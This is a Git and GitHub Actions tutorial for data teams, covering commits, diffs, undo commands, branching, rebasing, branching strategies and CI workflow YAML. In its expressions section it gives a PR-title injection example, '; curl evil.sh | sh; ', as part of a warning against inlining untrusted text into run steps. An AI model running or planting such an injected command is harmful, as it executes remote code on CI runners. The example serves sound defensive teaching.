Introduction to Git

Git is a program that remembers every version of your project. Each time you reach a good point, you take a snapshot called a commit. Later you can see what changed, who changed it and why, go back to any snapshot, and work on several ideas at once without them getting in each other's way.

Think of a video game with save points. You save before the boss fight. If it goes badly, you load the save and try again. Git is save points for code, except every save point also records a note ("added null check to the orders job"), the author, and the exact lines that changed, and you can share save points with your whole team.

A tiny bit of history

Linus Torvalds wrote Git in April 2005 to manage the Linux kernel after the team lost access to their previous tool. He needed something that was very fast, could handle thousands of contributors, and worked with no central server. Junio Hamano has maintained Git since July 2005. Today Git is used by almost every software and data team in the world; GitHub, GitLab, Bitbucket and AWS-hosted repos all store Git repositories.

Why version control?

Version control is any system that records changes to files over time so you can recall specific versions later. For a data team it is the difference between "we can explain and reproduce exactly what ran in production last Tuesday" and "we think it was roughly this code".

Three generations of version control

Local

Copying folders (project_old, project_backup) or simple tools like RCS. One person, one machine, easy to lose.

Centralized

One server holds the history (CVS, Subversion, Perforce). You check files out from it. If the server is down, nobody can commit; if it is lost, history is lost.

Distributed

Every clone is a full copy of the history (Git, Mercurial). You commit locally, offline, and sync when ready. Any clone can restore the server.

Concrete benefits on a data team

  • Audit trail. Regulated work (healthcare, pharma, finance) needs to show who changed a transformation and when. Git history plus pull-request reviews give that for free.
  • Reproducibility. Tag the exact commit that produced a dataset (v2026.11.08) and you can rebuild it.
  • Safe experiments. Try a new partition strategy on a branch; throw it away if it does not work.
  • Code review. A second pair of eyes on SQL and PySpark catches bugs before they hit prod tables.
  • Automation. Git events (push, pull request, tag) trigger CI/CD: tests, linting and deploys.
  • Infrastructure as code. Terraform, CloudFormation, CDK, Glue job definitions and IAM policies all live in Git, so infrastructure changes get reviewed too.
What belongs in Git

Code (Python, PySpark, SQL, DAGs), configuration, infrastructure code, tests, documentation, small sample data for tests. Not in Git: real datasets, secrets and credentials, build outputs, virtual environments, large binaries (use S3, Secrets Manager, artifact stores or Git LFS instead).

  • Version control = recorded history you can inspect, compare and restore.
  • Distributed (Git) beats centralized: offline commits, full history everywhere, no single point of failure.
  • Version code and config, never data or secrets.

How Git thinks: snapshots and hashes

Older tools stored a list of file changes ("line 12 changed"). Git stores snapshots: each commit is a picture of every file at that moment. Unchanged files are not copied again; Git just points to the earlier identical copy. Every piece of content gets a hash, a 40-character fingerprint calculated from the content itself, so Git always knows if anything was altered.

Hashes: fingerprints for everything

Git runs the content through SHA-1 (SHA-256 in new repos once Git 3.0 lands) and uses the result as the object's name. Change one character and the hash changes completely. Because a commit's hash includes its parent's hash, changing any old commit changes every commit after it, which is why "rewriting history" is a big deal on shared branches.

Hashes come from contentShell
$ echo "hello" | git hash-object --stdin
$ echo "hello!" | git hash-object --stdin
$ git log --oneline -3
Output
ce013625030ba8dba906f756967f9e9ca394464a
a8a940627d132695a9769df883f85992f0ff4a43
9f8e7d2 (HEAD -> main) Document job
d4e5f61 Fix null handling
a1b2c3d Add ingest job

You only ever need the first 7 or so characters (9f8e7d2) to refer to a commit.

Why this design matters

  • Integrity: you cannot change history or corrupt a file silently; the hashes would not match.
  • Speed: comparing two snapshots is fast, and most commands never touch the network.
  • Cheap branches: a branch is a 41-byte file holding a commit hash. Creating one is instant.

Git stores snapshots, not diffs. A commit points to a tree that describes the whole project, and unchanged files are shared between commits by hash. Diffs are calculated on demand when you ask for them. Since a commit's ID covers its content and its parent, history is tamper-evident.

  • Each commit = full snapshot + parent pointer + metadata. Unchanged files are shared.
  • Every object is named by a hash of its content; 7 characters are enough to refer to a commit.
  • Changing an old commit changes all later hashes: that is "rewriting history".

The Git workflow: three areas

Git has three places your changes live. The working directory is the files you edit. The staging area (also called the index) is a waiting room where you put the changes you want in the next commit. The repository is the permanent history of commits. You move changes left to right with git add and git commit.

Packing a parcel. Your desk is the working directory: things are scattered while you work. The open box is the staging area: you choose exactly what goes in. Taping the box and writing the label is the commit: sealed, labelled and recorded. You can leave half-finished work on the desk and still ship a clean parcel.

Why have a staging area at all?

It lets you make focused commits. Say you fixed a bug in the Glue job and also reformatted a config file. Stage and commit the bug fix alone ("Fix duplicate rows in orders merge"), then commit the formatting separately. Reviewers and future you can understand each change, and you can revert the bug fix without touching the formatting.

The everyday loopShell
$ git status          # what changed?
$ git diff            # see the actual lines
$ git add jobs/orders_etl.py
$ git commit -m "Fix duplicate rows in orders merge"
$ git pull            # get teammates' work
$ git push            # share yours
  • Three areas: working directory → staging area (index) → repository; then push to a remote.
  • add stages, commit records, push shares, pull receives.
  • Staging lets you split messy work into clean, focused commits.

Every file in your folder is either untracked (Git has never seen it) or tracked. A tracked file is unmodified, modified (changed since the last commit) or staged (marked for the next commit). git status tells you which state each file is in and even suggests the next command.

The "MM" trap

If you stage a file and then edit it again, only the staged version goes into the commit. Run git add again if you want the latest edits included. git diff shows unstaged edits; git diff --staged shows what will be committed.

  • States: untracked, unmodified, modified, staged.
  • git status -sb: left column = staged, right column = unstaged, ?? = untracked.
  • Read the hints in git status; they tell you the exact undo command.

How big should a commit be?

One logical change that leaves the code working. "Add SCD2 merge for customers table and its tests" is one commit. "Monday's work" is not. A useful test: could you describe it in one sentence without the word "and"? If you need "and", it is probably two commits.

I keep commits small and atomic, each one a single logical change that passes tests, with an imperative subject and a body that explains why. I use git add -p to separate unrelated edits. That makes reviews faster and lets us revert or cherry-pick a single change cleanly.

  • git add -p for precise staging; git commit -m for quick messages, plain git commit for detailed ones.
  • -am skips untracked files.
  • Message: imperative subject ≤ ~50 chars, blank line, body explains why.

If you commit a secret

Treat it as leaked, immediately
  1. Rotate the credential first (deactivate the IAM access key, regenerate the token). Bots scrape public GitHub for keys within minutes; once pushed, assume it is compromised even if you delete it.
  2. Remove it from history with git filter-repo (see the "Rewriting history" lesson) and force-push, and ask teammates to re-clone.
  3. Check CloudTrail for use of the leaked key.
Better: never have the secret in the repo

Read secrets at runtime from AWS Secrets Manager or SSM Parameter Store, use IAM roles (Glue job role, Lambda execution role) instead of access keys, and in GitHub Actions use OIDC so there are no long-lived keys at all. Turn on GitHub push protection, which blocks pushes containing recognised secrets like AWS keys.

  • Commit a .gitignore on day one; github.com/github/gitignore has templates.
  • Already tracked? git rm --cached file then ignore it.
  • Leaked secret: rotate first, clean history second.

Moving, renaming and deleting files

Git does not store "renames" as a special event. It sees a file disappear and a very similar file appear, and works out that it was a rename. Using git mv and git rm simply does the file operation and stages it in one step.

Rename, move and deleteShell
$ git mv jobs/etl.py jobs/orders_etl.py
$ git mv utils/ common/
$ git rm scripts/old_backfill.sh
$ git rm --cached big_extract.csv    # untrack but keep the local file
$ git status -s
Output

R  utils/dates.py -> common/dates.py
D  scripts/old_backfill.sh
D  big_extract.csv

If you rename with Finder or mv instead, just run git add -A; Git still detects the rename when the content is at least 50% similar. Use git log --follow to see a file's history across renames.

Tip

Rename in one commit and edit in the next. If you rename and heavily change a file in the same commit, similarity can drop below 50% and Git will show a delete plus an add, making review and history harder.

  • git mv = move + stage. git rm = delete + stage. git rm --cached = untrack, keep file.
  • Renames are detected by content similarity.

git diff: what it compares

git diff shows the exact lines that differ between two versions. The tricky part is knowing which two versions you are comparing. Plain git diff compares your working files with the staging area. git diff --staged compares the staging area with the last commit. git diff HEAD compares your working files with the last commit, i.e. everything you have changed.

See it happenShell
$ echo 'MAX_RETRIES = 5' >> jobs/config.py
$ git diff --stat
$ git add jobs/config.py
$ git diff --stat          # nothing: no unstaged changes left
$ git diff --staged --stat
Output
 jobs/config.py | 1 +
 1 file changed, 1 insertion(+)
 jobs/config.py | 1 +
 1 file changed, 1 insertion(+)

Quick reference

CommandComparesTypical question
git diffworking ↔ indexWhat have I changed but not staged?
git diff --stagedindex ↔ HEADWhat am I about to commit?
git diff HEADworking ↔ HEADEverything since my last commit
git diff HEAD~1 HEADcommit ↔ commitWhat did the last commit change? (same as git show)
git diff main featuretip ↔ tipHow do these branches differ right now?
git diff main...featuremerge-base ↔ featureWhat did the feature branch add? (what a PR shows)
git diff -- pathany of the above, one pathLimit to a file or folder
git diff origin/mainworking ↔ remote-tracking branchHow am I different from what's on GitHub (as of last fetch)?

git diff with no arguments is working tree versus index, --staged is index versus HEAD, and git diff HEAD is everything since the last commit. For pull-request style comparisons I use the three-dot form, main...feature, which diffs from the merge base so it only shows the feature's own changes.

  • diff = unstaged, diff --staged = staged, diff HEAD = both.
  • Always run git diff --staged before committing.
  • Put -- before paths to avoid ambiguity with branch names.

Two dots vs three dots

git diff main..feature (or main feature) compares the tips of both branches: it includes changes made on main since you branched, shown in reverse. git diff main...feature compares the merge base (where the feature branched off) with the feature tip: only what the feature added. Pull requests on GitHub show the three-dot view.

Find the merge base yourselfShell

$ git diff $(git merge-base main feature/scd2) feature/scd2 --stat   # same as main...feature/scd2
Output

In CI: which files changed in this PR?

git fetch origin main --depth=50 && git diff --name-only origin/main...HEAD. Use it to run tests only for touched Glue jobs or validate only changed DAGs. In GitHub Actions remember actions/checkout clones with depth 1 by default, so set fetch-depth: 0 or fetch the base branch first, otherwise there is no merge base and the command fails.

Two-dot diff compares branch tips, so it includes changes main made after we branched. Three-dot diff compares from the merge base, so it shows only what the branch introduced. That is why PR diffs use three dots. With git log the semantics change: two dots means commits reachable from the right but not the left.

  • diff A..B = tip vs tip. diff A...B = merge-base(A,B) vs B.
  • PRs = three-dot diff.
  • Shallow clones in CI need more history for merge-base to work.

Which undo command? A decision map

Git has several undo commands because there are several things to undo: an edit you have not staged, a file you staged by mistake, the last commit's message, a commit that is already on GitHub. Pick the command by asking two questions: where is the mistake (working files, staging area, local commit, pushed commit) and do I want to keep the work?

SituationCommandSafe for shared branches?
Throw away unstaged edits to a filegit restore fileYes (local only, but edits are lost)
Unstage a file, keep the editsgit restore --staged fileYes
Fix the last commit's message or add a forgotten filegit commit --amendOnly if not pushed
Undo local commits, keep changes stagedgit reset --soft HEAD~1Only if not pushed
Undo local commits, keep changes unstagedgit reset HEAD~1Only if not pushed
Undo local commits and delete the changesgit reset --hard HEAD~1Only if not pushed; destructive

The golden rule

Never rewrite commits that others already have. Commands that change existing commits (amend, reset, rebase) are fine on your own unpushed or personal branch. On main or any branch teammates use, undo with git revert, which adds a new commit instead of changing old ones.

  • Unpushed: restore, amend, reset. Pushed/shared: revert.
  • reflog rescues almost anything committed in the last 90 days.

git restore, amend and clean

git restore (Git 2.23+) is the modern, clear command for undoing changes to files. Older tutorials use git checkout -- file and git reset HEAD file for the same jobs; they still work but are easy to confuse with switching branches.

Discard and unstageShell
$ git restore jobs/orders_etl.py              # discard unstaged edits (gone for good)
$ git restore --staged jobs/orders_etl.py     # unstage, keep edits in the file
$ git restore --staged --worktree jobs/orders_etl.py   # unstage AND discard
$ git restore --source=HEAD~3 config/prod.yaml   # bring back the version from 3 commits ago
$ git restore --source=main -- dags/            # make dags/ match main
$ git restore -p jobs/orders_etl.py           # discard hunk by hunk
No undo for restore

Uncommitted edits discarded with git restore (or checkout --, reset --hard) were never saved in Git, so even reflog cannot bring them back. If unsure, git stash instead — it is reversible.

Fixing the last commit with --amend

Common amend usesShell
$ git commit --amend -m "Deduplicate orders on order_id"   # new message
$ git add tests/test_orders.py
$ git commit --amend --no-edit       # add forgotten file, keep message
$ git commit --amend --reset-author --no-edit   # fix wrong author email

Amend creates a new commit with a new hash and moves the branch to it. If you already pushed the old one, pushing the amended commit requires a force-push — fine on your own PR branch (use --force-with-lease), never on main.

  • clean -n before clean -f.

git reset: soft, mixed, hard

git reset <commit> moves your current branch pointer back to an earlier commit. The mode decides what happens to the changes from the commits you "removed": --soft keeps them staged, --mixed (the default) keeps them in your files but unstaged, --hard deletes them.

Squash your last 3 local commits into oneShell
$ git reset --soft HEAD~3
$ git commit -m "Add customers SCD2 job with tests"
Match the remote exactly (throw away local commits)Shell
$ git fetch origin
$ git reset --hard origin/main
Output
HEAD is now at 7c1e9a2 Deduplicate orders on order_id before merge
ModeBranch pointerStaging areaWorking files
--softmovedunchanged (keeps changes staged)unchanged
--mixedmovedresetunchanged
--hardmovedresetreset (destructive)

Reset moves the branch pointer. Soft leaves the index and working tree alone, mixed resets the index, hard resets index and working tree. I use soft to squash local commits, mixed to re-split them, and hard only to discard local work, for example reset --hard origin/main. I never reset a shared branch; for that I use revert.

  • soft = keep staged, mixed = keep unstaged, hard = discard.
  • Reset rewrites history: local/personal branches only.
  • Lost commits after a reset? git reflog.

git revert: undo safely on shared branches

git revert <commit> creates a new commit that does the exact opposite of an old one. History is not changed; it just gains an "undo" commit. Because nobody's existing commits are altered, it is the safe way to back out a bad change that is already on main or in production.

Revert a bad commitShell
$ git log --oneline -4
$ git revert 3d4e5f6 --no-edit
$ git push
Output

3d4e5f6 Change partition column to load_date
2c3d4e5 Add retries
[main 5e6f7a8] Revert "Change partition column to load_date"

Variations

More revert optionsShell
$ git revert HEAD                       # undo the most recent commit
$ git revert A..C                       # undo a range (one revert commit each)
$ git revert --no-commit A..C && git commit -m "Revert batch"   # one combined commit
$ git revert -m 1 <merge-sha>           # undo a whole merged PR

-m 1 tells Git which parent is the "mainline" (parent 1 = the branch you merged into). On GitHub, every merged PR has a Revert button that creates a revert PR for you.

Reverting a merge has a catch

After reverting a merged PR, Git considers those commits "already merged". If you later fix the branch and try to merge it again, the old commits will not come back. Either revert the revert (git revert <revert-sha>) first, or create fresh commits.

For anything already pushed to a shared branch I use git revert: it adds an inverse commit, keeps history intact and needs no force-push. For a merged PR I revert the merge commit with -m 1 or use GitHub's Revert button, then redeploy. Reset is for local, unpublished history only.

  • Revert = new inverse commit, no history rewrite, safe on main.
  • Merge commits need -m 1.
  • To re-apply a reverted merge, revert the revert.

git reflog: your safety net

The reflog is a private diary of every place HEAD and your branches have pointed: every commit, checkout, reset, rebase and merge. Even after a "destructive" reset or a botched rebase, the old commits still exist and the reflog tells you their hashes. Entries are kept for 90 days by default.

Recover after an accidental reset --hardShell
$ git reset --hard HEAD~3       # oops - that was 3 hours of work
$ git reflog -6
$ git reset --hard HEAD@{1}     # go back to where HEAD was before the reset

$ git reflog

Limits
  • Reflog is local to your clone; it is not pushed and a fresh clone has none.
  • It only knows about things that were committed. Edits never committed (or stashed) cannot be recovered.
  • Unreachable commits are pruned by git gc after their reflog entries expire (90 days, 30 for unreachable).

If someone loses commits after a reset or rebase, I check git reflog, find the hash from before the operation and reset or branch from it. It works because Git never immediately deletes commit objects; they stay until garbage collection after the reflog entries expire.

  • git reflog → find the hash → git reset --hard it or git branch name hash.
  • ORIG_HEAD holds the tip before the last reset/merge/rebase.
  • Commit early: committed work is almost impossible to lose.

Working with branches

A branch is a separate line of work. You create one for each feature or fix, commit freely on it, and merge it back when it is ready, while main stays stable. Technically a branch is just a tiny file containing one commit hash, and HEAD is a pointer to the branch you are on.

Branch commandsShell
$ git branch                         # list local branches (* = current)

Naming branches

Use a type prefix and a short description, plus a ticket if your team uses one: feature/DATA-1423-orders-dedupe, fix/null-amount, hotfix/prod-glue-timeout, chore/upgrade-glue-5. Lowercase, hyphens, no spaces.

Switching with uncommitted changes

If your edits would be overwritten by the other branch, Git refuses to switch. Commit, git stash, or use git switch -m. If the edits do not conflict, they simply come along with you to the new branch — surprising the first time.

  • Branch = movable pointer to a commit; HEAD = pointer to the current branch.
  • git switch -c name to create, git switch name to move, -d/-D to delete.
  • One branch per feature/fix; keep them short-lived.

Merging branches

git merge feature brings the commits from feature into the branch you are on. If your branch has not moved since the feature branched off, Git simply slides the pointer forward (fast-forward). If both branches have new commits, Git creates a merge commit with two parents that combines them (three-way merge).

Merging a feature into mainShell
$ git switch main
$ git pull
$ git merge feature/scd2
Output
Merge made by the 'ort' strategy.

 tests/test_customers_scd2.py | 61 +++++++++++
 2 files changed, 145 insertions(+)
Merge optionsShell
$ git merge --ff-only feature      # refuse unless fast-forward possible
$ git merge --no-ff feature        # always create a merge commit (keeps the feature visible)
$ git merge --squash feature       # stage all feature changes as one; you then commit
$ git merge --abort                # bail out of a conflicted merge

  • --no-ff, --ff-only, --squash, --abort.
  • Default merge strategy is ort (since Git 2.34).

Handling merge conflicts

A conflict happens when two branches changed the same lines of the same file (or one deleted a file the other edited). Git cannot know which version is right, so it stops, marks the spots in the file, and waits for you to choose. Conflicts are normal, not errors.

A conflict appearsShell
$ git merge feature/new-threshold
$ git status -s
Output
Auto-merging config/quality.yaml
CONFLICT (content): Merge conflict in config/quality.yaml
Automatic merge failed; fix conflicts and then commit the result.
UU config/quality.yaml
What Git writes into the file (zdiff3 style)config/quality.yaml
checks:
  orders:
<<<<<<< HEAD
    max_null_pct: 0.5
    min_rows: 10000
||||||| merge base
    max_null_pct: 1.0
    min_rows: 10000
=======
    max_null_pct: 1.0
    min_rows: 50000
>>>>>>> feature/new-threshold
  • Between <<<<<<< HEAD and |||||||: your branch's version.
  • Between ||||||| and =======: the original (merge base) — shown with merge.conflictStyle zdiff3. This makes it obvious that HEAD changed max_null_pct and the feature changed min_rows.
  • Between ======= and >>>>>>>: the incoming branch's version.

Resolve in five steps

  1. Understand both sides. git log --merge -p config/quality.yaml shows the commits on each side that touched the file.
  2. Edit the file to the correct final content and delete all marker lines. Here the right answer keeps both intents: max_null_pct: 0.5 and min_rows: 50000.
  3. Test — run the unit tests or at least load the YAML.
  4. Stage: git add config/quality.yaml (or git add --resolved 2.56+, which refuses files still containing markers).
  5. Finish: git commit (merge) or git rebase --continue (rebase).
Handy conflict commandsShell
$ git diff --name-only --diff-filter=U    # list conflicted files
$ git checkout --ours   config/quality.yaml   # take our whole version of this file
$ git checkout --theirs config/quality.yaml   # take their whole version
$ git mergetool                           # open VS Code 3-way merge editor
$ git merge --abort                       # give up, back to before the merge
$ git diff --check                        # find leftover conflict markers
--ours and --theirs flip during rebase

In a merge, "ours" is the branch you are on. In a rebase, Git is replaying your commits onto the other branch, so "ours" is the upstream and "theirs" is your commit. Read the markers, not your assumptions.

Preventing painful conflicts

  • Keep branches short-lived (days, not weeks) and pull main into them often.
  • Small PRs touch fewer lines.
  • Agree a formatter (ruff, sqlfluff, prettier) so reformatting does not collide with real edits.
  • Turn on git config --global rerere.enabled true: Git reuses recorded resolutions, so the same conflict during repeated rebases is fixed automatically.
  • Conflict = same lines changed on both sides. Edit, remove markers, add, commit.
  • Set merge.conflictStyle zdiff3 to see the original too.
  • --abort is always available; ours/theirs swap meaning in rebase.

Rebase: replaying your commits

git rebase main takes the commits on your branch and replays them one by one on top of the latest main, as if you had started your work today. The result is a straight line with no merge commit. Because replayed commits get new hashes, rebase rewrites history — so only rebase branches that are yours alone.

Update your feature branch with the latest mainShell
$ git switch feature/scd2
$ git fetch origin
$ git rebase origin/main
# fix any conflicts, then:
$ git add <file> && git rebase --continue
$ git push --force-with-lease      # branch was already pushed, so its history changed
Output
Successfully rebased and updated refs/heads/feature/scd2.

Merge vs rebase

Merge

  • Preserves exact history, never rewrites
  • Safe on shared branches
  • Adds merge commits; history can look tangled

Rebase

  • Linear, easy-to-read history
  • Rewrites commits (new hashes)
  • Needs force-push if already pushed; never on shared branches
The golden rule of rebasing

Do not rebase commits that exist outside your repository and that people may have based work on. Rebasing main or a shared release branch forces everyone else to untangle duplicated commits.

force-with-lease, not force

git push --force overwrites the remote branch no matter what. --force-with-lease refuses if the remote has commits you have not seen (for example a teammate pushed a fix to your PR branch), so you cannot silently delete their work.

Both integrate changes. Merge preserves history and adds a merge commit; rebase replays my commits onto the target for a linear history but rewrites hashes. I rebase my own feature branch onto main to stay current and keep PRs clean, push with --force-with-lease, and never rebase shared branches.

  • Rebase = replay commits on a new base; new hashes.
  • OK on your own branch; never on main/shared.
  • Push rebased branches with --force-with-lease. Stuck? git rebase --abort.

Cherry-pick: copy one commit

git cherry-pick <sha> copies the change from one commit and applies it as a new commit on your current branch. Use it to bring a single bug fix from main into a release branch, or to rescue one good commit from an abandoned branch.

Backport a hotfix to a release branchShell
$ git switch release/2026.11
$ git cherry-pick -x 3f2e1d0
Output
[release/2026.11 9b8a7c6] Fix timezone in order_date

More optionsShell

Don't overuse it

Cherry-picked commits are duplicates with different hashes. Copying lots of commits between long-lived branches leads to confusing history and repeated conflicts. Prefer merging, and use cherry-pick for occasional targeted fixes.

  • Cherry-pick = apply one commit's change elsewhere as a new commit.
  • Use -x for traceability; great for hotfix backports.

  • stash push -m to save, stash pop to restore, -u for untracked files.
  • Stashes are local only; don't leave work there for days.

Detached HEAD explained

Normally HEAD points to a branch, and new commits move that branch. If you check out a specific commit or tag (git switch --detach v1.3.0), HEAD points straight at the commit: detached HEAD. You can look around and even commit, but no branch remembers those commits, so they are easy to lose when you switch away.

Inspect an old releaseShell
$ git switch --detach v1.3.0
$ git status
Output
HEAD detached at v1.3.0
nothing to commit, working tree clean
Made commits while detached? Save themShell
$ git switch -c fix/from-v1.3.0     # create a branch here, commits are safe
# or, after leaving: find the hash in git reflog and git branch <name> <hash>

CI systems (including GitHub Actions' checkout for pull requests and tags) often run in detached HEAD. That is why scripts use git rev-parse HEAD or $GITHUB_SHA rather than a branch name.

  • Detached HEAD = HEAD points at a commit, not a branch.
  • Fine for looking; create a branch before committing.

A remote is a named URL of another copy of the repository, usually on GitHub. origin is the default name for the place you cloned from. Your clone keeps remote-tracking branches like origin/main: read-only bookmarks of where the remote's branches were the last time you talked to it.

Multiple remotes and syncing a fork

When you fork a project, you have two remotes: origin (your fork, which you can push to) and upstream (the original, which you cannot). To stay current, fetch from upstream and update your branches from it.

$ git switch main

$ gh repo sync sai-kumar-reddy-korsapati/airflow    # one-command alternative

  • origin = your fork, upstream = the original.
  • Fetch upstream → update main → branch from it → push to origin → PR to upstream.

Creating and securing your GitHub account

Sign up at github.com with a username you would be happy to show an employer — it appears in every URL of your work. Then lock the account down: GitHub requires two-factor authentication for everyone who contributes code, and passkeys make signing in both safer and faster.

  1. Sign up with your personal email (keep it when you change jobs; add the work email as a secondary address, or use a separate account if your company requires it).

Branching strategies

A branching strategy is the team's agreement on which branches exist, where work starts, and how code reaches production. The three you will hear about are GitHub Flow (simple: main + short feature branches), trunk-based development (everyone integrates into main at least daily, often behind feature flags), and Git Flow (long-lived develop and release branches).

GitHub Flow

  • main is always deployable
  • Branch per change → PR → review + CI → merge → deploy
  • Best default for most data teams

Trunk-based

  • Very short branches (hours) or direct commits to main
  • Unfinished work hidden by feature flags / config
  • Needs strong automated tests; fastest delivery

Git Flow

  • main + develop + feature/* + release/* + hotfix/*
  • Suits scheduled, versioned releases (installed software)
  • Heavy for continuously deployed pipelines; many merge conflicts

Environment branches: avoid them

Some teams keep dev, qa and prod branches and merge between them. It looks tidy but the branches drift, hotfixes get forgotten in one of them, and "what is in prod" becomes hard to answer. Prefer one main branch, promote the same commit through environments using GitHub Actions environments with approvals and per-environment config (Actions chapter).

Release branches when you need them

If you must support an older version (for example a client still on pipeline v1.x), cut release/1.x from the tag, cherry-pick fixes into it, and tag patch releases there. Keep it the exception.

I default to GitHub Flow: main is always deployable, short-lived feature branches, PRs with required CI and review, squash merge. Merges deploy to dev automatically and the same commit is promoted to prod through a protected environment or a version tag. I avoid long-lived environment branches because they drift.

  • GitHub Flow for most teams; trunk-based when tests are strong; Git Flow only for scheduled versioned releases.
  • Promote one commit through environments instead of dev/qa/prod branches.

Merge queue

On busy repos, "require up to date" means everyone keeps clicking "Update branch". A merge queue instead tests each PR combined with the PRs ahead of it and merges them in order. Workflows must also trigger on merge_group for their checks to run in the queue.

Tag rulesets

Protect v* tags so only release managers (or the release workflow) can create them and nobody can move or delete a production tag.

What GitHub Actions is

GitHub Actions runs automation when something happens in your repository: a push, a pull request, a tag, a schedule, a button click. You describe the automation in a YAML file under .github/workflows/. GitHub starts a fresh virtual machine (a runner), checks out your code and runs your steps: install, lint, test, build, deploy to AWS. It is CI/CD built into GitHub.

A workflow is a recipe card pinned to your repo: "when a PR is opened (trigger), in a clean kitchen (runner), do these dishes (jobs), each made of these steps (steps), using these ready-made tools (actions)". Every time the trigger happens, a new cook follows the card from scratch.

Key terms

Workflow
A YAML file in .github/workflows/. A repo can have many.
Event / trigger
What starts it: push, pull_request, schedule, workflow_dispatch…
Job
A set of steps on one runner. Jobs run in parallel by default.
Step
One command or one action.
Action
A reusable unit from the Marketplace or your org (actions/checkout, aws-actions/configure-aws-credentials).
Runner
The machine: GitHub-hosted (Ubuntu, Windows, macOS, ARM, GPU, larger sizes) or self-hosted.
Run / attempt
One execution of a workflow; re-runs create new attempts.

Cost in one paragraph

Public repos: standard GitHub-hosted runners are free. Private repos: each plan includes free minutes per month (Free 2,000, Team 3,000, Enterprise 50,000 for Linux), then per-minute billing; Windows and macOS minutes cost more, and larger runners are always billed. Self-hosted runners use your own machines. Check your organisation's billing page for current numbers.

  • Event → workflow → jobs (parallel, separate VMs) → steps (sequential, same VM).
  • run: = shell command; uses: = reusable action.
  • Files live in .github/workflows/*.yml.

Your first workflow: Python CI

Let's build the most common workflow on any data team: on every pull request and every push to main, check out the code, install Python and dependencies, lint, and run the unit tests. If anything fails, the PR shows a red X and (with branch rules) cannot merge.

.github/workflows/ci.ymlYAML
name: CI

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read          # least privilege for GITHUB_TOKEN

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true   # a new push cancels the old run on the same branch

jobs:
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - name: Check out code
        uses: actions/checkout@v6

      - name: Set up Python
        uses: actions/setup-python@v6
        with:
          python-version: "3.11"
          cache: pip

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -e ".[dev]"

      - name: Lint
        run: ruff check . && ruff format --check .

      - name: Unit tests
        run: pytest -q --junitxml=report.xml

Triggers: when workflows run

The on: key lists events that start a workflow, with optional filters for branches, tags, paths and activity types. Choosing the right trigger (and filter) keeps CI fast and prevents unwanted deploys.

Filter rules worth memorising

  • branches/branches-ignore and paths/paths-ignore cannot be combined for the same event (use ! negation inside paths instead).
  • Glob: * matches within a folder, ** across folders.
  • If both branches and paths are set, both must match.
  • Path filters on push evaluate the pushed commits; skipped workflows don't report status — a required check skipped by a path filter stays "pending", so use a job-level if with a change-detection step for required checks.
  • schedule runs only on the default branch, can be delayed at busy times (avoid :00), and is disabled after 60 days without repo activity on public repos.

Jobs, steps and runners

Jobs are the units GitHub schedules onto runners. By default they run at the same time; needs creates an order. Inside a job, steps share the machine and filesystem, run top to bottom, and stop at the first failure unless told otherwise.

Jobs with dependencies, containers and servicesYAML
jobs:
  lint:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v6
      - run: pipx run ruff check .

  test:
    runs-on: ubuntu-24.04
    container: python:3.11-slim        # run steps inside this image
    services:
      postgres:                        # a database for integration tests
        image: postgres:16
        env: { POSTGRES_PASSWORD: test }
        options: >-
          --health-cmd "pg_isready" --health-interval 5s --health-retries 10
    defaults:
      run:
        working-directory: jobs/orders
        shell: bash
    steps:
      - uses: actions/checkout@v6
      - run: pip install -r requirements-dev.txt
      - run: pytest -q
        env:
          PGHOST: postgres             # service name is the hostname inside a container job

  package:
    needs: [lint, test]                # waits for both
    runs-on: ubuntu-24.04-arm          # ARM runner (matches Graviton / Glue arm builds)
    steps:
      - uses: actions/checkout@v6
      - run: python -m pip wheel . -w dist/

Contexts, expressions and conditions

Anything inside ${{ }} is an expression that GitHub evaluates before the step runs. Expressions read contexts — objects full of information such as the event (github), secrets, variables, previous steps' outputs and the matrix — and can call functions like contains() or success(). You use them for dynamic values and for if: conditions.

Conditions

  - name: Deploy only from main pushes
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    run: ./deploy.sh

  - name: Only for tags

Other handy functions

contains(a, b), startsWith, endsWith, format('{0}-{1}', a, b), join(array, ','), toJSON(obj) (great for debugging: run: echo '${{ toJSON(github.event) }}'), fromJSON(str) (build a matrix from a previous job's JSON output), hashFiles('**/requirements*.txt') (cache keys), and a ternary-like ${{ github.ref == 'refs/heads/main' && 'prod' || 'dev' }}.

Expressions are substituted into scripts as text

run: echo "${{ github.event.pull_request.title }}" pastes the PR title into your bash script before it runs. A title like "; curl evil.sh | sh; " becomes code. Pass untrusted values through env: and reference "$TITLE" in the script instead (Security lesson).

  • ${{ }} evaluates expressions over contexts: github, env, vars, secrets, steps, needs, matrix, inputs.
  • Use failure(), always()/!cancelled() for cleanup and notifications.
  • Never inline untrusted event text into run:; go via env.

Masking

Secret values are replaced with *** in logs. Values you compute (like a token fetched from Secrets Manager) are not masked automatically — mask them with echo "::add-mask::$TOKEN" before using them.

Secrets rules
  • Secrets are not passed to workflows triggered by PRs from forks (protects you from strangers' code).
  • Don't put structured JSON in one secret; masking works on exact strings.
  • For AWS, don't store access keys as secrets at all — use OIDC (dedicated lesson).
  • Prefer environment-scoped secrets for prod so only approved deploy jobs can read them.
  • vars for config, secrets for sensitive values, env for local wiring.
  • $GITHUB_OUTPUT → steps.id.outputs.x; $GITHUB_ENV → later steps' env; $GITHUB_STEP_SUMMARY → Markdown report.
  • ::add-mask:: for values you fetch at runtime.

Matrix builds

A matrix runs the same job many times with different values, in parallel: several Python versions, several Glue jobs, several AWS regions. You write the job once and GitHub expands it.

Test across Python and Spark versionsYAML
jobs:
  test:
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false            # keep other combos running if one fails
      max-parallel: 4
      matrix:
        python: ["3.10", "3.11", "3.12"]
        spark: ["3.5.6"]
        include:
          - python: "3.12"
            spark: "4.0.1"        # one extra combination
            experimental: true
        exclude:
          - python: "3.10"
            spark: "3.5.6"
    continue-on-error: ${{ matrix.experimental == true }}
    name: py${{ matrix.python }} / spark${{ matrix.spark }}
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-python@v6
        with: { python-version: "${{ matrix.python }}", cache: pip }
      - run: pip install "pyspark==${{ matrix.spark }}" -e ".[dev]"
      - run: pytest -q

Dynamic matrix: one job per changed Glue job

